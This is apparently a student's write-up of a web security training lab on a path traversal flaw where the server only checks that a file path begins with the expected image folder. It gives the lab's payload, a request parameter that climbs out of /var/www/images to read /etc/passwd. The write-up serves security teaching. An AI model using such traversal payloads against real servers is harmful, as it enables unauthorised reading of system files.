# Lab: File path traversal, validation of start of path

This lab contains a path traversal vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

---

**Analysis:** Sometimes it will expect you to start at the base folder. 

`/image?filename=/var/www/images`

`filename=/var/www/images/../../../etc/passwd`

**Payload:** The payload is the same as our description so this one should be easy.

```php
image?filename=/var/www/images/../../../etc/passwd 
```

